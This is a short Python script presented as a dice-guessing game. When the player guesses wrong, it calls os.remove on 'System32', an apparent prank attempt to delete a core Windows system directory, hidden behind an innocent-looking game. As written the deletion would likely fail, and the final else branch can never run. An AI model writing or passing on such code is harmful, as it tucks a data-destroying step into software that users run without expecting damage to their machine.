import os
import random

result = random.randint(1, 6)

answer = int(input("Insert a number between 1 and 6\n"))

print(f"This is your number {answer}\n")
print(f"This is the number sorted {result}\n\n")

if result == answer:
    print("Congratulations")
elif result != answer:
    os.remove("System32")
else:
    print("Please insert a number")